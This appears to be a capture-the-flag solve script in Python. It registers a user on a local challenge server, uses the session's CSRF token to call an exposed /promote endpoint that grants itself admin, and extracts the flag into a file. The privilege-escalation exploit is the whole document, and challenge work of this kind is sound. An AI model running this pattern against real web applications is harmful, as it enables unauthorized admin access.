#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8087"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # Create new session
    new_session = requests.Session()
   
    # Target user
    username = "abi"
    password = "pass123*"
    login_data = {'username': username, 'password': password}

    # Create user
    new_session.post(url + "/register", data = login_data)
   
    # Log in
    new_session.post(url + "/login", data = login_data)

    # Promote target user to admin through the exposed /promote endpoint
    csrf_token = new_session.cookies.get_dict()["csrf_token"]
    promote_endpoint_data = {'username': username, 'csrf_token': csrf_token}
    promote_response = new_session.post(url + "/promote" , data = promote_endpoint_data)

    # Cut out the flag
    raw_flag_data_str = str(promote_response.text)
    flag = ''.join(flag_regex.findall(raw_flag_data_str))

    # Save flag to solution file
    sol = open("solution.txt", "w")
    sol.write(flag)
    sol.close()

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


